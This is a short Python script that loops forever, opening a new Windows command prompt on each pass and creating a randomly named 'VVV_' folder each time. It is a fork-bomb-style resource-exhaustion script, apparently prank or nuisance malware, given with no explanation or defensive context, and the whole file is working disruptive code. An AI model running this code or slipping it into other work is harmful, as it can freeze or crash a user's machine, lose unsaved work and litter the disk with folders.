import os

while True:
    os.system("start cmd")
    folder_name = f"VVV_{os.urandom(4).hex()}"
    os.mkdir(folder_name)
